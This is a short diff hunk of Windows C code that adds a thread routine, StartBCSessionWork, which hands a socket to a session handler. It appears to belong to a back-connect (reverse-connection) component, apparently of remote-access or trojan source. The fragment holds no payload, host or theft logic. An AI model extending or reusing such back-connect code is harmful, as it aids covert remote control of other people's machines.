@@ -860,6 +860,8 @@ bool ExecuteBackConnectCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
 	return StartThread(BackConnectThread, H) != NULL;
 }
 
-
-
-
+DWORD WINAPI StartBCSessionWork( LPVOID lpData )
+{
+	SessionWork( (SOCKET)lpData );
+	return 0;
+}
